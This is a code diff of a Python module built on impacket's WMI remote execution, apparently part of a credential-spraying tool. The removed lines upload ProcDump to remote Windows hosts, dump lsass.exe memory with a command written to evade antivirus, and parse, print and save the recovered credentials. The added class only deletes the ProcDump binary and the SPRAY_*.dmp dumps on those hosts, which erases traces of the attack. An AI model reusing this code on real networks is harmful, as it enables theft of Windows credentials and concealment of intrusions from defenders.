@@ -36,16 +36,10 @@ import logging
 import ntpath
 
 import os, sys, logging, ntpath, time, shutil, pathlib
-from datetime import datetime
 from core.Utils import *
 from core.Colors import *
 from core.Paths import *
 from core.Logs import *
-from core.Dump import *
-from core.ParseDump import *
-from core.PrintCreds import *
-from core.WriteCreds import *
-from core.Timeout import *
 from impacket.dcerpc.v5.dcomrt import DCOMConnection
 from impacket.dcerpc.v5.dcom import wmi
 from impacket.dcerpc.v5.dtypes import NULL
@@ -61,7 +55,7 @@ from six import PY2
 OUTPUT_FILENAME = '__' + str(time.time())
 CODEC = sys.stdout.encoding
 
-class WMIEXEC:
+class WMIEXEC_DELETE:
     def __init__(self, smbConnection, username='', password='', domain='', lmhash=None, nthash=None, aesKey=None, share='C$', noOutput=False, doKerberos=False, kdcHost=None):
         self.__smbConnection = smbConnection
         self.__username = username
@@ -88,54 +82,25 @@ class WMIEXEC:
 
             self.shell = RemoteShell(self.__share, win32Process, self.__smbConnection)
             
-            # Upload procdump
-            procpath = os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'misc', 'procdump', 'procdump%s.exe' % (osArch))
-            logging.info("%s  Uploading procdump to %s..." % (debugBlue, addr))
+            # Delete Procdump
+            cmd = "del procdump%s.exe" % (osArch)
+            logging.info("%s  Deleting ProcDump on %s..." % (debugBlue, addr))
             if logging.getLogger().getEffectiveLevel() > 10:
                 with suppress_std():
-                    self.shell.do_put(procpath)
-            else:
-                self.shell.do_put(procpath)
-            
-            dt = datetime.now().strftime("%m-%d-%Y_%H-%M-%S")
-            dumpName = "SPRAY_" + addr + "_" + dt
-
-            # Execute procdump silently with pid to avoid AVs as much as possible
-            cmd = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do procdump{}.exe -accepteula -ma ^%B C:\\{}.dmp""".format(osArch, dumpName)
-            logging.info("%s  Executing procdump on %s..." % (debugBlue, addr))
-            with timeout(15):
-                if logging.getLogger().getEffectiveLevel() > 10:
-                    with suppress_std():
-                        self.shell.onecmd(cmd)
-                else:
                     self.shell.onecmd(cmd)
+            else:
+                self.shell.onecmd(cmd)
 
-            # Create dump's file descriptor to parse dumps remotely
-            logging.info("%s  Creating dump's file descriptor on %s..." % (debugBlue, addr))
-            logging.info("%s  Parsing %s's dump remotely..." % (debugBlue, addr))
-            dump = Dump(self.__smbConnection, """{}.dmp""".format(dumpName))
-            credentials = parseDump(dump, addr)
-            if credentials is not None and credentials:
-                print_credentials(addr, credentials)
-                write_credentials(addr, credentials)
+            # Delete Dumps
+            cmd = "del SPRAY_*.dmp"
+            logging.info("%s  Deleting dumps on %s..." % (debugBlue, addr))
+            if logging.getLogger().getEffectiveLevel() > 10:
+                with suppress_std():
+                    self.shell.onecmd(cmd)
+            else:
+                self.shell.onecmd(cmd)
+
         finally:
-            # Clean remote machines (dump & procdump)
-            logging.info("%s  Closing dump file on %s..." % (debugBlue, addr))
-            dump.close()
-            logging.info("%s  Deleting procdump on %s..." % (debugBlue, addr))
-            if logging.getLogger().getEffectiveLevel() > 10:
-                with suppress_std():
-                    self.shell.onecmd("del procdump%s.exe" % (osArch))
-            else:
-                self.shell.onecmd("del procdump%s.exe" % (osArch))
-
-            logging.info("%s  Deleting dump on %s..." % (debugBlue, addr))
-            if logging.getLogger().getEffectiveLevel() > 10:
-                with suppress_std():
-                    self.shell.onecmd("del %s.dmp" % (dumpName))
-            else:
-                self.shell.onecmd("del %s.dmp" % (dumpName))
-
             if self.__smbConnection is not None:
                 self.__smbConnection.logoff()
             dcom.disconnect()
